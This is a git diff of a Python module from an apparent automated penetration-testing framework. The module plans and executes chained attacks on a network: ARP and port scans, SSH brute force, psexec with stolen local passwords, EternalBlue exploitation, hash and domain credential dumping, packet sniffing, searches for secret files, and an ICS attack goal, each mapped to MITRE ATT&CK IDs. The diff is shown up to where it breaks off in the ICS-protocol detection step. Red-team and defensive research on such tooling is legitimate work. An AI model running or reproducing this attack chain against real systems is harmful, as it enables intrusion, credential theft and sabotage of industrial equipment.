@@ -7,14 +7,20 @@
 # ネットワークセグメント単位でシンボルを割り当てていく
 from arsenal import arpscan
 from arsenal import mynmap
-from arsenal import write_json
 from arsenal import msploit
 from arsenal import masscan
+from arsenal import ics_detect
+from database import write_json
+from database import attack_tree
+from database import mushilogger
 import json
 import random
-import time
 import subprocess
 import copy
+import pprint
+from ipaddress import IPv4Network
+from ipaddress import IPv4Interface
+from ipaddress import IPv4Address
 
 # シンボルを定義
 class GoapSymbol():
@@ -22,141 +28,174 @@ class GoapSymbol():
   node = []
   link = []
   node_json = {}
-  attack_list = {} # ipaddress と node の配列番号を管理
   node_id = 0
   pre_node_id = 0
+  mushikago_ipaddr = ""
+  class_a = []
+  class_b = []
+  mode = ""
 
   def __init__(self, actionfile):
     print("init symbol..")
 
     # 各アクションの格納
     self.actions = self.load_action(actionfile)
+    if actionfile == "actions-it.json":
+      self.mode = "it"
+    elif actionfile == "actions-ics.json":
+      self.mode = "ics"
+
+    # mushikago の IPアドレスの取得
+    self.mushikago_ipaddr = self.get_ipaddr()
+
+    # class A の プライベートIPアドレスの取得
+    self.class_a.append('10.0.0.0')
+    for num in range(1, 256):
+      self.class_a.append(str(IPv4Address('10.0.0.0') + 65536*num))
+
+    # class B の プライベートIPアドレスの取得
+    self.class_b.append('172.16.0.0')
+    for num in range(1, 16):
+      self.class_b.append(str(IPv4Address('172.16.0.0') + 65536*num))
    
     # ゴール条件
     self.goal = {
       # 制御機器を攻撃したか 
       "GoalSymbol_AttackIcs": True, 
-      # 機密情報を収集したか
-      "GoalSymbol_GetSecretInfo": True
+      # ローカルの機密情報を収集したか
+      "GoalSymbol_GetLocalSecretInfo": True,
+      # ネットワーク上の機密情報を収集したか
+      "GoalSymbol_GetNwSecretInfo": True
     }
 
     # 現在値
     self.state = {
       # 同一LANの端末を探索したか T1120
-      "Symbol_GetLanNodes": False,
+      "Symbol_GetLanNodes": None,
       # TCP ポートスキャンを実行したか T1046 T1018
-      "Symbol_TcpScan": False,
+      "Symbol_TcpScan": None,
       # UDP ポートスキャンを実行したか T1046 T1018
-      "Symbol_UdpScan": False,
+      "Symbol_UdpScan": None,
       # 端末のOSを特定したか T1003, T1059
-      "Symbol_IdentOs": False,
-      # 横展開しているか TA0008
-      "Symbol_LateralMovement": False,
+      "Symbol_IdentOs": None,
+      # 横展開を実行したか TA0008
+      "Symbol_LateralMovement": None,
       # ブルートフォースアタックを実行したか T1110
-      "Symbol_BruteForce": False,
+      #"Symbol_BruteForce": None,
       # ARP Cache Poisoning をしたか T1557 T1112(registry modify)
-      "Symbol_ArpPoisoning": False,
+      "Symbol_ArpPoisoning": None,
       # ネットワーク情報を取得したか T1016, T1049
-      "Symbol_GetNetworkInfo": False,
-      # 端末のOSのパッチ情報などを取得したか T1003, T1059, T1082
-      "Symbol_GetOsCredential": False,
-      # 権限昇格しているか TA0004
-      "Symbol_PrivilegeEscalation": False,
+      "Symbol_GetNetworkInfo": None,
       # DC を探索したか T1482
-      "Symbol_DCCheck": False,
+      "Symbol_DCCheck": None,
       # ログオンユーザ情報を収集したか T1059
-      "Symbol_LogonUserInfo": False,
+      "Symbol_LogonUserInfo": None,
       # ドメインユーザの探索 T1087
-      "Symbol_DomainUser": False,
+      "Symbol_DomainUser": None,
       # ローカルユーザの探索 T1087
-      "Symbol_LocalUser": False,
+      "Symbol_LocalUser": None,
       # 有効なアカウントを利用したか T1078
-      "Symbol_ValidUser": False,
+      "Symbol_ValidUser": None,
       # 不正なアカウントを作成したか T1136
-      "Symbol_CreateUser": False,
+      "Symbol_CreateUser": None,
+      # 端末のOSのパッチ情報などを取得したか T1003, T1059, T1082
+      "Symbol_GetOsPatch": None,
+      # 権限昇格しているか TA0004
+      "Symbol_PrivilegeEscalation": None,
       # プロセス情報を収集したか(セキュリティ製品の探索も行う) T1057, T1059 
-      "Symbol_ProcessInfo": False,
+      "Symbol_ProcessInfo": None,
       # 別のプロセスに移動したか T1055
-      "Symbol_ProcessMigrate": False,
-      # 主要なディレクトリを調査したか T1083, TA0009, TA0010
-      "Symbol_MainDriveInfo": False,
+      "Symbol_ProcessMigrate": None,
+      # 主要なディレクトリを調査したか T1083(File and Directory Discovery), TA0009, TA0010
+      "Symbol_MainDriveInfo": None,
+      "Symbol_SearchMainDrive": None,
       # ネットワークドライブを確認したか T1083, T1135
-      "Symbol_NetDriveInfo": False,
-      # 機密情報を収集したか TA0009
-      "GoalSymbol_GetSecretInfo": False,
+      "Symbol_NwDriveInfo": None,
+      "Symbol_SearchNwDrive": None,
+      # ローカルの機密情報を発見したか TA0009
+      "GoalSymbol_GetLocalSecretInfo": None,
+      # ネットワーク上の機密情報を発見したか TA0009
+      "GoalSymbol_GetNwSecretInfo": None,
       # 別のネットワークセグメントを特定したか
-      "Symbol_NetworkSegmentCheck": False,
+      #"Symbol_NetworkSegmentCheck": None,
       # パケットを収集したか T1040
-      "Symbol_PacketInfo": False,
+      "Symbol_PacketInfo": None,
       # ICS プロトコルを特定したか T1046
-      "Symbol_GetIcsProtocol": False,
-      # ICS 機器を発見したか T1120
-      "Symbol_GetIcs": False,
+      "Symbol_GetIcsProtocol": None,
+      # ICS 機器を探索したか T1120
+      "Symbol_GetIcsDevice": None,
       # ICS 機器を攻撃したか TA0040
-      "GoalSymbol_AttackIcs": False
+      "GoalSymbol_AttackIcs": None
     }
 
+    # nodes を json 形式にして書き込む
+    self.wjson = write_json.WriteJson()
+
+    # テスト内容を CSV 形式にして書き込む
+    self.wcsv = attack_tree.AttackTree()
+    self.pre_exe = None
+
+    # mushikago log の出力
+    self.mlogger = mushilogger.MushiLogger()
 
   # action.jsonの読み込み
   def load_action(self, actionfile): 
     with open(actionfile) as f:
       return json.load(f)
 
+
+  # mushikago 本体の IPアドレスの取得
+  def get_ipaddr(self):
+    try:
+      ipaddr = subprocess.check_output('ifconfig eth0 | grep "inet " | grep -oP \'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*\' | sed \'s/inet //\'', shell=True).decode('utf-8')
+      #print(res)
+      return ipaddr.replace('\n', '')
+    except:
+      print("get-ipaddr error!!")
+
+
   
   # goap で planning する関数
   def goap_plannning(self, goap_node):
-    # 発見したデバイス情報を格納する辞書
   
     available_action = []
     plan = []
   
-    #print("actions = {}".format(goap_node.actions))
-    #print("goal = {}".format(goap_node.goal))
-    #print("state = {}".format(goap_node.state))
-  
-    #print(goap_node.actions.keys())
-    #print(goap_node.actions["arpscan"].keys())
-    #print(goap_node.actions["arpscan"]["effect"].keys())
-  
-    print("goap planning start..")
+    #print("goap planning start..")
+    # logging 
+    self.mlogger.writelog("goap planning start..", "info")
   
     # 仮に100回ほどループさせるようにしている
     # 最終的には、ゴールになるまでループさせる
     for i in range(100):
-      print("\n")
-      print("take = {}".format(i))
-      print("\n")
-      if (goap_node.state["GoalSymbol_AttackIcs"] == goap_node.goal["GoalSymbol_AttackIcs"] or goap_node.state["GoalSymbol_GetSecretInfo"] == goap_node.goal["GoalSymbol_GetSecretInfo"]):
-        print(plan)
-        print("final_state = {}".format(goap_node.state))
+      #print("\n")
+      print("\ntake = {}\n".format(i))
+      #print("\n")
+
+      if (goap_node.state["GoalSymbol_AttackIcs"] == goap_node.goal["GoalSymbol_AttackIcs"] or goap_node.state["GoalSymbol_GetLocalSecretInfo"] == goap_node.goal["GoalSymbol_GetLocalSecretInfo"] or goap_node.state["GoalSymbol_GetNwSecretInfo"] == goap_node.goal["GoalSymbol_GetNwSecretInfo"]):
         return plan
-        #print("\n")
-        #print("goap_node planning = {}".format(plan))
-        # demo用
-        #plan = ['arpscan', 'tcpscan_nmap', 'get_os_credential', 'get_maindrvinfo', 'exploit_lateral', 'get_networkinfo', 'priv_escalation', 'get_packetinfo', 'detect_ics_protocol', 'detect_ics', 'attack_ics']
-        #print("goap_node planning = {}".format(plan))
-        #print("\n")
-        #movie_demo(plan, node, link)
-        #return 0
-        #exit(0)
-        #break
   
       # 現在の state 値から実行できる action を取り出す
       for key in goap_node.actions.keys():
         match_count = 0
         for symbol, value in goap_node.actions[key]["precond"].items():
-          print("{}, {}, {}".format(key, symbol, value))
-          if (goap_node.state[symbol] == value):
+          #print("{}, {}, {}".format(key, symbol, value))
+          if (goap_node.state[symbol] == value): # 現在値と比較
             match_count += 1
         if (match_count == len(goap_node.actions[key]["precond"])):
-          print("match!!")
+          #print("match!!")
           available_action.append(key)
   
       print("available_action = {}".format(available_action))
+      # logging 
+      self.mlogger.writelog("available plan = " + pprint.pformat(available_action, width=500, compact=True), "info")
   
       # 何もアクションを実行できない場合は終了する
+      # ネットワークスキャンに変えるべし
       if (len(available_action) == 0):
-        print("No action")
+        print("No available action")
+        # logging 
+        self.mlogger.writelog("No available action", "info")
         exit(0)
   
       # 実行できる action から一つを選択する
@@ -173,8 +212,8 @@ class GoapSymbol():
         elif (goap_node.actions[key]["priority"] == tmp):
           tmp_list.append(key)
   
-      print("tmp_list = {}".format(tmp_list))
-      print("len(tmp_list) = {}".format(len(tmp_list)))
+      #print("tmp_list = {}".format(tmp_list))
+      #print("len(tmp_list) = {}".format(len(tmp_list)))
   
       # 同じ優先度リストの中からランダムに取り出し
       # これまでに選択した内容とは被らないものを選択する
@@ -187,276 +226,711 @@ class GoapSymbol():
         if priority_key not in plan:
           break
   
-      print("{}, {}".format(priority_key, goap_node.actions[priority_key]))
+      #print("{}, {}".format(priority_key, goap_node.actions[priority_key]))
   
       #print("pre_choise_key = {}".format(pre_choise_key))
   
       plan.append(priority_key)
       available_action.clear()
   
-      print("plan = {}".format(plan))
-  
-      print("state = {}".format(goap_node.state))
+      #print("plan = {}".format(plan))
+      #print("state = {}".format(goap_node.state))
   
       # action の結果を state に反映
       for key, value in goap_node.actions[priority_key]["effect"].items():
         goap_node.state[key] = value
-        print("key = {}, value = {}".format(key, value))
+        #print("key = {}, value = {}".format(key, value))
   
-      print("state = {}".format(goap_node.state))
+      #print("state = {}".format(goap_node.state))
 
 
   # target を選定する関数
   def select_target(self):
-    target_list = {}
-    secondary_list = {}
+    target_list = {} # まだ攻撃していない端末
+    performed_list = {} # 攻撃成功して機密情報の探索をしていない端末
 
-    # Windows 端末の探索
-    for num in range(1, len(self.node), 1):
+    # 将来的にはポート番号等も考慮に入れて優先度を決める
+    # Linux 端末の探索 (22/tcp:ssh が開いている端末を target とする)
+    for num in range(1, len(self.node)): # 0 番目は mushikago 自身が格納
+      if self.node[num]["os"] == "Linux":
+        # 攻撃成功セッションがなければ攻撃候補にする
+        if self.node[num]["session"] == "" and self.node[num]["goap"]["Symbol_LateralMovement"] == None:
+          if len(self.node[num]["ports"]) > 0:
+            for port_num in range(0, len(self.node[num]["ports"])):
+              #if self.node[num]["ports"][port_num]["number"] == "22/tcp" and self.node[num]["ports"][port_num]["service"] == "ssh":
+              if self.node[num]["ports"][port_num]["number"] == "22/tcp" and self.node[num]["ports"][port_num]["service"] == "ssh":
+                target_list[self.node[num]["id"]] = num
+        else: # すでに攻撃をしてセッションが確立している端末
+          # 機密情報を探索をしていない端末
+          if self.mode == "it": # IT mode の場合
+            if self.node[num]["goap"]["Symbol_SearchMainDrive"] == None or self.node[num]["goap"]["Symbol_SearchNwDrive"] == None:
+              performed_list[self.node[num]["id"]] = num
+          elif self.mode == "ics": # ICS mode の場合
+            if self.node[num]["goap"]["Symbol_GetIcsProtocol"] == None or self.node[num]["goap"]["Symbol_GetIcsDevice"] == None:
+              performed_list[self.node[num]["id"]] = num
+      # Windows 端末の探索
       if self.node[num]["os"] == "Windows":
         # 攻撃成功セッションがなければ攻撃候補にする
-        if self.node[num]["session"] == "":
+        if self.node[num]["session"] == "" and self.node[num]["goap"]["Symbol_LateralMovement"] == None:
           target_list[self.node[num]["id"]] = num
-        else:
-          secondary_list[self.node[num]["id"]] = num
+        else: # すでに攻撃をしてセッションが確立している端末
+          # 機密情報を探索をしていない端末
+          if self.mode == "it": # IT mode の場合
+            if self.node[num]["goap"]["Symbol_SearchMainDrive"] == None or self.node[num]["goap"]["Symbol_SearchNwDrive"] == None:
+              performed_list[self.node[num]["id"]] = num
+          elif self.mode == "ics": # ICS mode の場合
+            if self.node[num]["goap"]["Symbol_GetIcsProtocol"] == None or self.node[num]["goap"]["Symbol_GetIcsDevice"] == None:
+              performed_list[self.node[num]["id"]] = num
 
     print("target_list = {}".format(target_list))
-    print("secondary_list = {}".format(secondary_list))
+    print("performed_list = {}".format(performed_list))
 
     # 候補の中からランダムにターゲットを選定
     # 今後、ターゲットの選定方法の条件を追加する
-    target, node_num = random.choice(list(target_list.items()))
+    # ターゲットがいない場合、ネットワークスキャンを行う
+    if len(performed_list) != 0:
+      target, node_num = random.choice(list(performed_list.items()))
+      target_list.clear()
+      performed_list.clear()
+      #print("goap_state = {}".format(self.node[node_num]["goap"]))
+      return target, node_num, self.node[node_num]["goap"]
+    elif len(target_list) != 0:
+      target, node_num = random.choice(list(target_list.items()))
+      target_list.clear()
+      performed_list.clear()
+      #print("goap_state = {}".format(self.node[node_num]["goap"]))
+      return target, node_num, self.node[node_num]["goap"]
+    else:
+      return None, None, None
     
-    target_list.clear()
-    secondary_list.clear()
-
-    return target, node_num
-
 
   # planning を実行する関数
-  def plan_execute(self, goap_node, node_id, plan):
+  def plan_execute(self, goap_node, node_id, plan, target, node_num):
+    #print("plan = {}".format(plan))
 
-    print("plan = {}".format(plan))
-    #plan = ["arpscan", "tcpscan", "exploit_lateral", "get_processinfo", "get_networkinfo", "get_local_user", "get_domain_user", "get_netdrvinfo", "get_packetinfo", "detect_ics_protocol"]
-    #plan = ["arpscan", "tcpscan", "exploit_lateral", "get_processinfo", "get_networkinfo", "get_local_user", "get_domain_user", "get_networkinfo"]
-    #plan = ["arpscan", "tcpscan", "exploit_lateral", "ipconfig", "ps", "netstat", "netuse", "netuser", "netuserdomain", "netuse", "creds_tspkg"]
-    #plan = ["exploit_lateral2"]
-    #plan = ["creds_tspkg", "arpscan_fm_mp"]
-    print("plan = {}".format(plan))
+    # logging 
+    self.mlogger.writelog("action plan = " + pprint.pformat(plan, width=500, compact=True), "info")
 
     for p in plan:
-      print("action = {}".format(p))
+      print("execute action = {}".format(p))
+
 
       # arp scan の実施
       if p == "arpscan":
-        pre_node_id = node_id
-        arpscanInstance = arpscan.ArpScan()
-        node_id = arpscanInstance.execute_arpscan(self.node, self.link, node_id)
-        #print(node)
-        #print(link)
+        # mushikago が最初に実施する ARP Scan
+        if target == self.mushikago_ipaddr:
+          pre_node_id = node_id
+          arpscanInstance = arpscan.ArpScan()
+          node_id = arpscanInstance.execute_arpscan(self.node, self.link, node_id)
+          node_id = node_id + 1 # mushikago 分を入れるため
+          self.node_json['nodes'] = self.node
+          self.node_json['links'] = self.link
+          #print("node_json = {}".format(self.node_json))
+          #print("node_id = {}".format(node_id))
 
-        self.node_json['nodes'] = self.node
-        self.node_json['links'] = self.link
-        print("node_json = {}".format(self.node_json))
-        #print("node_id = {}".format(node_id))
+          # 検証内容を CSV 形式にして書き込み
+          if self.pre_exe == None: # 最初に実行された場合にカラムを追加
+            self.wcsv.write(["name", "parent", "ip", "mitre"])
+            target = self.node[0]["id"] # target を mushikago にする
 
-        # nodes を json 形式にして書き込み
-        wjson = write_json.WriteJson()
-        wjson.write(self.node_json)
+          self.wcsv.write(["T1120 (arpscan) - " + self.node[0]["id"], self.pre_exe, self.node[0]["id"], "T1120"])
+          self.pre_exe = "T1120 (arpscan) - " + self.node[0]["id"]
 
-        goap_node.state["Symbol_GetLanNodes"] = True
+          # 現在値を更新
+          goap_node.state["Symbol_GetLanNodes"] = True
+          self.node[0]["goap"] = copy.deepcopy(goap_node.state)
 
-        #return node_id
+          # nodes を json 形式にして書き込み
+          self.wjson.write(self.node_json)
 
-      # metasploit 経由での ARP
-      elif p == "arpscan_mp":
-        exploit = msploit.MetaSploit()
-        exploit.execute_arpscan("10.2.200.0", "255.255.0.0")
 
-        pre_node_id = node_id
-        arpscanInstance = arpscan.ArpScan()
+        # mushikago 以外の端末からの ARP Scan (Windows)
+        else:
+          exploit = msploit.MetaSploit()
+          nwaddr = IPv4Interface(target+'/16').network
+          exploit.execute_arpscan(str(nwaddr[0]), "/16", self.node, node_num)
 
-        node_id = arpscanInstance.execute_arpscan_fm_mp(node, link, node_id)
+          pre_node_id = node_id
+          arpscanInstance = arpscan.ArpScan()
 
-        node_json['nodes'] = node
-        node_json['links'] = link
-        print("node_json = {}".format(node_json))
-        print("node_id = {}".format(node_id))
+          node_id = arpscanInstance.execute_arpscan_fm_mp(self.node, self.link, node_id, target)
 
-        # nodes を json 形式にして書き込み
-        wjson.write(node_json)
-        wjson.write(self.node_json)
+          # 検証内容を CSV 形式にして書き込み
+          self.wcsv.write(["T1120 (arpscan) - " + target, self.pre_exe, target, "T1120"])
+          #self.pre_exe = "T1120 (arpscan) - " + target
 
-        goap_node.state["Symbol_GetLanNodes"] = True
+          # 現在値を更新
+          goap_node.state["Symbol_GetLanNodes"] = True
+          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
+          # nodes を json 形式にして書き込み
+          self.wjson.write(self.node_json)
+
+
 
       # tcp scan の実施
       elif p == "tcpscan":
         # nmap の実施
         mynmapInstance = mynmap.MyNmap()
+        #mynmapInstance = mynmap2.MyNmap()
+
+        # proxychains 経由させるかの設定
+        proxy = 0
 
         for num in range(pre_node_id, node_id, 1):
-          mynmapInstance.execute_nmap(self.node[num]["id"], num, self.node)
-          #execute_nmap(node[num]["ipaddr"], num, node)
+          mynmapInstance.execute_nmap(self.node[num]["id"], num, self.node, proxy)
 
-        #self.node_json['nodes'] = self.node
-        #self.node_json['links'] = self.link
-        print("node_json = {}".format(self.node_json))
-        #print("node_id = {}".format(node_id))
+        #print("node_json = {}".format(self.node_json))
+
+        # 検証内容を CSV 形式にして書き込み
+        if self.pre_exe == "T1120 (arpscan) - " + self.node[0]["id"]: # 初めての tcpscan の場合
+          self.wcsv.write(["T1046 (tcpscan) - " + self.node[0]["id"], self.pre_exe, self.node[0]["id"], "T1046, T1018"])
+          self.pre_exe = "T1046 (tcpscan) - " + self.node[0]["id"]
+          # 現在値を更新
+          goap_node.state["Symbol_TcpScan"] = True
+          goap_node.state["Symbol_IdentOs"] = True
+          self.node[0]["goap"] = copy.deepcopy(goap_node.state)
+        else: # 2回目以降 (lateral 後に実施する arp scan)
+          self.wcsv.write(["T1046 (tcpscan) - " + target, self.pre_exe, target, "T1046, T1018"])
+          #self.pre_exe = "T1046 (tcpscan) - " + target
+          # 現在値を更新
+          goap_node.state["Symbol_TcpScan"] = True
+          goap_node.state["Symbol_IdentOs"] = True
+          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
 
         # nodes を json 形式にして書き込み
-        wjson = write_json.WriteJson()
-        wjson.write(self.node_json)
+        self.wjson.write(self.node_json)
 
-        goap_node.state["Symbol_TcpScan"] = True
 
 
       # lateral movement(eternalblue) の実行
       elif p == "exploit_lateral":
-        # ターゲットにする端末を選定し、IP アドレスを格納
-        target, node_num = self.select_target()
+        res = -1
 
-        # Metasploit 実行
-        exploit = msploit.MetaSploit()
-        res = exploit.execute_eternalblue(target, node_num, self.node)
+        # exploit の選定
 
-        # 攻撃に成功した場合、IP アドレスを管理
-        # target を成功した IP アドレスにする
+        # ssh bruteforce を実施
+        if res != 0 and self.node[node_num]["os"] == "Linux":
+          exploit = msploit.MetaSploit()
+          res = exploit.execute_ssh_bruteforce(target, node_num, self.node)
+
+        # Administrator を取得している場合、psexec を試す
+        if res != 0:
+          for num in range(1, len(self.node)): 
+            if len(self.node[num]["local_account_pass"]) > 0:
+              value = iter(self.node[num]["local_account_pass"])
+              for account, password in zip(value, value):
+                # Metasploit 実行
+                exploit = msploit.MetaSploit()
+                res = exploit.execute_ms17_10_psexec(target, node_num, self.node, self.mushikago_ipaddr, account, password)
+                if res == 0:
+                  break
+            else:
+              continue
+
+        # local accout pass を取得している場合、ms17-010-psexec を試す
+        if res != 0 and self.node[node_num]["os"] == "Windows":
+          for num in range(1, len(self.node)): 
+            if len(self.node[num]["local_account_pass"]) > 0:
+              value = iter(self.node[num]["local_account_pass"])
+              for account, password in zip(value, value):
+                # Metasploit 実行
+                exploit = msploit.MetaSploit()
+                res = exploit.execute_ms17_10_psexec(target, node_num, self.node, self.mushikago_ipaddr, account, password)
+                if res == 0:
+                  break
+            else:
+              continue
+
+        # eternalblue の実行
+        if res != 0 and self.node[node_num]["os"] == "Windows":
+          exploit = msploit.MetaSploit()
+          res = exploit.execute_eternalblue(target, node_num, self.node, self.mushikago_ipaddr)
+
+        # lateral movement に成功した場合 
         if res == 0:
-          self.attack_list[target] = node_num
-          print("attack_list = {}".format(self.attack_list))
-          target = self.node[node_num]["id"]
+          # 現在値を更新
           goap_node.state["Symbol_LateralMovement"] = True
+          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
+          # 検証内容を CSV 形式にして書き込み
+          self.wcsv.write(["TA0008 (exploit_lateral) - " + target, self.pre_exe, target, "TA0008"])
+          self.pre_exe = "TA0008 (exploit_lateral) - " + target
+          # nodes を json 形式にして書き込み
+          self.wjson.write(self.node_json)
+        else: # 失敗した場合
+          # 現在値を更新
+          goap_node.state["Symbol_LateralMovement"] = False
+          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
+          # 検証内容を CSV 形式にして書き込み
+          self.wcsv.write(["TA0008 (exploit_lateral) - " + target, self.pre_exe, target, "TA0008"])
+          self.pre_exe = "TA0008 (exploit_lateral) - " + target
+
+          # nodes を json 形式にして書き込み
+          self.wjson.write(self.node_json)
+
+          print("replanning...")
+          # logging 
+          self.mlogger.writelog("replanning...", "info")
+
+          return node_id
+
+
+        """
+        exploit.execute_bluekeep("10.1.200.5")
+        exploit.execute_incognito()
+        """
 
 
       # ネットワーク情報の取得
       elif p == "get_networkinfo":
         # ipconfig の実施
         exploit = msploit.MetaSploit()
-        exploit.execute_ipconfig(self.attack_list[target], self.node)
+        exploit.execute_ipconfig(node_num, self.node)
 
         # netstat の実施
-        exploit.execute_netstat(self.attack_list[target], self.node)
+        exploit.execute_netstat(node_num, self.node)
+
+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["T1016(get_networkinfo) - " + target, self.pre_exe, target, "T1016, T1049"])
+        #self.pre_exe = "T1016(get_networkinfo)"
           
+        # 現在値を更新
         goap_node.state["Symbol_GetNetworkInfo"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
+
+        # nodes を json 形式にして書き込み
+        self.wjson.write(self.node_json)
+
 
         
       # プロセスの取得とセキュリティツールの動作確認の実施
       elif p == "get_processinfo":
         # Metasploit 実行
         exploit = msploit.MetaSploit()
-        exploit.execute_ps(self.attack_list[target], self.node)
+        exploit.execute_ps(node_num, self.node)
+
+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["T1057 (get_processinfo) - " + target, self.pre_exe, target, "T1057, T1059"])
+        #self.pre_exe = "T1057 (get_processinfo)"
+
+        # 現在値を更新
+        goap_node.state["Symbol_ProcessInfo"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
 
         # nodes を json 形式にして書き込み
-        wjson = write_json.WriteJson()
-        wjson.write(self.node_json)
+        self.wjson.write(self.node_json)
 
-        goap_node.state["Symbol_ProcessInfo"] = True
 
       # local user の一覧とパスワードの取得
       elif p == "get_local_user":
         # Metasploit 実行
         exploit = msploit.MetaSploit()
-        exploit.execute_netuser(self.attack_list[target], self.node)
+        exploit.execute_netuser(node_num, self.node)
 
         # local account の password と hash dump を取得
-        exploit.get_hash(target, self.attack_list[target], self.node)
+        exploit.get_hash(target, node_num, self.node)
+
+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["T1087 (get_local_user) - " + target, self.pre_exe, target, "T1087"])
+        #self.pre_exe = "T1087 (get_local_user)"
+
+        # 現在値を更新
+        goap_node.state["Symbol_LocalUser"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
 
         # nodes を json 形式にして書き込み
-        wjson = write_json.WriteJson()
-        wjson.write(self.node_json)
+        self.wjson.write(self.node_json)
 
-        goap_node.state["Symbol_LocalUser"] = True
 
       # domain user の一覧とパスワードの取得
       elif p == "get_domain_user":
         # net user /domain 実行
         exploit = msploit.MetaSploit()
-        exploit.execute_netuserdomain(self.attack_list[target], self.node)
+        exploit.execute_netuserdomain(node_num, self.node)
 
         # creds tspkg の実施 (domain のパスワードを取得)
-        exploit.execute_creds_tspkg(self.attack_list[target], self.node)
+        exploit.execute_creds_tspkg(node_num, self.node)
+
+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["T1087 (get_domain_user) - " + target, self.pre_exe, target, "T1087"])
+        #self.pre_exe = "T1087 (get_domain_user)"
+
+        # 現在値を更新
+        goap_node.state["Symbol_DomainUser"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
 
         # nodes を json 形式にして書き込み
-        wjson = write_json.WriteJson()
-        wjson.write(self.node_json)
+        self.wjson.write(self.node_json)
 
-        goap_node.state["Symbol_DomainUser"] = True
+
+
+      # OS のパッチ情報と脆弱性の取得
+      elif p == "get_ospatch":
+        exploit = msploit.MetaSploit()
+        exploit.execute_getospatch(node_num, self.node)
+
+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["T1003 (get_ospatch) - " + target, self.pre_exe, target, "T1003, T1059, T1082"])
+        #self.pre_exe = "T1003 (get_ospatch)"
+        
+        # 現在値を更新
+        goap_node.state["Symbol_GetOsPatch"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
+
+        # nodes を json 形式にして書き込み
+        self.wjson.write(self.node_json)
+
+
+      # ローカルドライブの探索
+      elif p == "get_maindrvinfo":
+        exploit = msploit.MetaSploit()
+        secret_data =  exploit.execute_getmaindrvinfo(node_num, self.node)
+        #secret_data =  exploit.execute_getlocalsecretinfo(1, self.node)
+
+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["T1083 (get_maindrvinfo) - " + target, self.pre_exe, target, "T1083, TA0009, TA0010"])
+        #self.pre_exe = "T1083 (get_maindrvinfo)"
+        
+        # 現在値を更新
+        goap_node.state["Symbol_MainDriveInfo"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
+
+        # nodes を json 形式にして書き込み
+        self.wjson.write(self.node_json)
+
 
       # ネットワークドライブの探索
       elif p == "get_netdrvinfo":
         # net user の実施
         exploit = msploit.MetaSploit()
-        exploit.execute_netuse(self.attack_list[target], self.node)
+        exploit.execute_netuse(node_num, self.node)
+
+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["T1083 (get_netdrvinfo) - " + target, self.pre_exe, target, "T1083, T1135"])
+
+        # 現在値を更新
+        goap_node.state["Symbol_NetDriveInfo"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
 
         # nodes を json 形式にして書き込み
-        wjson = write_json.WriteJson()
-        wjson.write(self.node_json)
+        self.wjson.write(self.node_json)
 
-        goap_node.state["Symbol_NetDriveInfo"] = True
+
+      # ローカルドライブ上の機密情報の探索
+      elif p == "get_local_secretinfo":
+        exploit = msploit.MetaSploit()
+        secret_data = exploit.execute_getlocalsecretinfo(node_num, self.node)
+
+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["TA0009 (get_local_secretinfo) - " + target, self.pre_exe, target, "TA0009"])
+        
+        # 現在値を更新
+        if secret_data == 1:
+          goap_node.state["GoalSymbol_GetLocalSecretInfo"] = True
+        else:
+          goap_node.state["GoalSymbol_GetLocalSecretInfo"] = False
+
+        goap_node.state["Symbol_SearchMainDrive"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
+
+        # nodes を json 形式にして書き込み
+        self.wjson.write(self.node_json)
+
+
+      # ネットワークドライブ上の機密情報の探索
+      elif p == "get_nw_secretinfo":
+        secret_data = 0
+
+        # network drive が存在している場合のみ実行
+        if len(self.node[node_num]["network_drive"]) > 0:
+          exploit = msploit.MetaSploit()
+          secret_data = exploit.execute_getnwsecretinfo(node_num, self.node)
+
+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["TA0009 (get_nw_secretinfo) - " + target, self.pre_exe, target, "TA0009"])
+        #self.pre_exe = "get_nw_secretinfo"
+
+        if secret_data == 1:
+          goap_node.state["GoalSymbol_GetNwSecretInfo"] = True
+        else:
+          goap_node.state["GoalSymbol_GetNwSecretInfo"] = False
+
+        # 現在値を更新
+        goap_node.state["Symbol_SearchNwDrive"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
+
+        # nodes を json 形式にして書き込み
+        self.wjson.write(self.node_json)
+
 
       # パケットの取得
       elif p == "get_packetinfo":
         # network sniffing の実施
         exploit = msploit.MetaSploit()
-        exploit.execute_sniff(self.attack_list[target], self.node)
+
+        if self.node[node_num]["os"] == "Windows":
+          exploit.execute_sniff_win(node_num, self.node)
+        elif self.node[node_num]["os"] == "Linux":
+          exploit.execute_sniff_linux(node_num, self.node)
+
+        # 検証内容を CSV 形式にして書き込み
+        self.wcsv.write(["T1040 (get_packetinfo) - " + target, self.pre_exe, target, "T1040"])
+        #self.pre_exe = "T1040 (get_packetinfo)"
+
+        # 現在値を更新
+        goap_node.state["Symbol_PacketInfo"] = True
+        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
 
         # nodes を json 形式にして書き込み
-        wjson = write_json.WriteJson()
-        wjson.write(self.node_json)
+        self.wjson.write(self.node_json)
 
-        goap_node.state["Symbol_PacketInfo"] = True
 
       # パケット解析による ICS プロトコルの特定
       elif p == "detect_ics_protocol":
-        num = self.attack_list[target]
+        ics = ics_detect.IcsDetect()
+
+        ics.detect_protocol(node_num, self.node)
         
-        p_list = {}
-        p_list.clear()
